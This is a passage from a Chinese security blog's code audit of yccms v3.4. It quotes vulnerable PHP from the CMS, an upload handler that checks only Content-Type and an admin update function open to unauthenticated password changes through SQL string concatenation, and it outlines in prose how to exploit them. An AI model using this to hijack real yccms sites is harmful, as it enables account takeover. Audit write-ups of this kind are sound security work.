+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//xheditor编辑器专用上传</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">xhUp</span>(<span class="hljs-params"></span>) </span>&#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>])) &#123;<br>			<span class="hljs-variable">$_fileupload</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileUpload</span>(<span class="hljs-string">&#x27;filedata&#x27;</span>,<span class="hljs-number">10</span>);<br>			<span class="hljs-variable">$_err</span>=<span class="hljs-variable">$_fileupload</span>-&gt;<span class="hljs-title function_ invoke__">checkError</span>();<br>			<span class="hljs-variable">$_path</span> = <span class="hljs-variable">$_fileupload</span>-&gt;<span class="hljs-title function_ invoke__">getPath</span>();<br>			<span class="hljs-variable">$_msg</span>=<span class="hljs-string">&quot;&#x27;..<span class="hljs-subst">$_path</span>&#x27;&quot;</span>;<br>			<span class="hljs-variable">$_img</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>(<span class="hljs-variable">$_path</span>);<br>			<span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">xhImg</span>(<span class="hljs-number">650</span>,<span class="hljs-number">0</span>);<br>			<span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">out</span>();<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&#123;&#x27;err&#x27;:&#x27;&quot;</span>.<span class="hljs-variable">$_err</span>.<span class="hljs-string">&quot;&#x27;,&#x27;msg&#x27;:&quot;</span>.<span class="hljs-variable">$_msg</span>.<span class="hljs-string">&quot;&#125;&quot;</span>;<br>			<span class="hljs-keyword">exit</span>();<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertBack</span>(<span class="hljs-string">&#x27;警告：由于非法操作导致上传失败！&#x27;</span>);<br>		&#125;<br>	&#125;<br><br><br></code></pre></td></tr></table></figure>
+
+<p>代码中的文件名以时间+100到1000之间的随机数进行重命名</p>
+<p>同样也是检查的传入的Content-Type的值</p>
+<h3 id="未授权更改管理员账号密码"><a href="#未授权更改管理员账号密码" class="headerlink" title="未授权更改管理员账号密码"></a><strong>未授权更改管理员账号密码</strong></h3><p>首先来看一下漏洞利用过程，在未登录的情况下构造url,只需要更改username password notpassword的值即可更改数据库中admin账号的相关信息</p>
+<p>根据url来定位一下漏洞函数，函数位于controller\AdminAction.class.php中的update函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;用户名不能为空&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>            <span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;密码不能为空!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>            <span class="hljs-keyword">if</span>(!(validate::<span class="hljs-title function_ invoke__">checkStrEquals</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;notpassword&#x27;</span>]))) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;两次密码不一致!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;_model-&gt;username=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;_model-&gt;password=<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>            <span class="hljs-variable">$_edit</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">editAdmin</span>();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_edit</span>)&#123;<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码修改成功!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码未修改!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>            &#125;<br>        &#125;<br><br>            <span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br>            <span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/update.tpl&#x27;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到前面都是一些判断，重点关注下editAdmin()函数，该函数位于model\AdminModel.class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editAdmin</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$_sql</span>=<span class="hljs-string">&quot;UPDATE</span><br><span class="hljs-string">                    my_admin</span><br><span class="hljs-string">                SET</span><br><span class="hljs-string">                    username=&#x27;<span class="hljs-subst">$this</span>-&gt;username&#x27;,</span><br><span class="hljs-string">                    password=&#x27;<span class="hljs-subst">$this</span>-&gt;password&#x27;</span><br><span class="hljs-string">                WHERE</span><br><span class="hljs-string">                    id=1</span><br><span class="hljs-string">                LIMIT 1&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$_sql</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>该函数的父类为Model, 位于model\Model.class.php，看一下update函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$_sql</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$_sql</span>)-&gt;<span class="hljs-title function_ invoke__">rowCount</span>();<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>调用execute函数去执行sql语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$_sql</span></span>)</span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-variable">$_stmt</span>=<span class="hljs-variable language_">$this</span>-&gt;_db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$_sql</span>);<br>            <span class="hljs-variable">$_stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        &#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;SQL语句:&#x27;</span>.<span class="hljs-variable">$_sql</span>.<span class="hljs-string">&#x27;&lt;br /&gt;错误信息:&#x27;</span>.<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$_stmt</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这一系列的操作主要是用来生成SQL语句然后执行SQL语句，editAdmin函数直接把传进来的username password拼接到sql语句中，然后去更新相关表中id&#x3D;1的数据，这也就造成了任意更改管理员账号密码</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PHP/" class="category-chain-item">PHP</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#PHP 代码审计</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>yccms v3.4 代码审计</div>
+      <div>http://xvshifu.github.io/2025/07/12/yccms v3.4 代码审计/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xvsf</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/07/20/wuzhicms/" title="wuzhicms 代码审计">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">wuzhicms 代码审计</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/07/08/PHP%20storm%20%E9%85%8D%E7%BD%AE%20XDebug/" title="PHP storm 配置 XDebug">
+                        <span class="hidden-mobile">PHP storm 配置 XDebug</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","appKey":"p527aBaA4G01EJdMOVMGXsHR","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://0wmntqqc.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner" style="text-align:center; color:#555; margin-top:20px;">
+
+  <!-- 计时器 -->
+  <div style="margin-bottom:10px; font-size:14px; color:#ff6f61;">
+    🚀 已运行：
+    <span id="timeDate">载入天数...</span>
+    <span id="times">载入时分秒...</span>
+    <script>
+      function createtime() {
+          var now = new Date();
+          var grt = new Date("08/07/2025 00:00:00");
+          var diff = now - grt;
+
+          var days = Math.floor(diff / 1000 / 60 / 60 / 24);
+          var hours = Math.floor((diff / 1000 / 60 / 60) % 24);
+          var minutes = Math.floor((diff / 1000 / 60) % 60);
+          var seconds = Math.floor((diff / 1000) % 60);
+
+          if(hours<10) hours="0"+hours;
+          if(minutes<10) minutes="0"+minutes;
+          if(seconds<10) seconds="0"+seconds;
+
+          document.getElementById("timeDate").innerHTML = days + " 天";
+          document.getElementById("times").innerHTML = hours + " 时 " + minutes + " 分 " + seconds + " 秒";
+      }
+      setInterval(createtime, 1000);
+      createtime();
+    </script>
+  </div>
+
+  <!-- 自定义内容 -->
+  
+    <div style="margin-bottom:10px; font-size:13px; color:#666;">
+      ❤️  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+
+
+  <!-- PV/UV 统计（Busuanzi） -->
+  
+    <div style="margin-bottom:12px; font-size:14px; color:#3b82f6;">
+      👁‍🗨 总访问量：<span id="busuanzi_value_page_pv">载入中...</span>  
+      🧑 总访客数：<span id="busuanzi_value_site_uv">载入中...</span>
+    </div>
+    <script src="https://cdn.tutorialjinni.com/busuanzi/2.3.0/bsz.pure.mini.js"></script>
+  
+
+
+</div>
+
+<script src="/js/summon-plane.js"></script>
+
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/xm_custom/custom.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
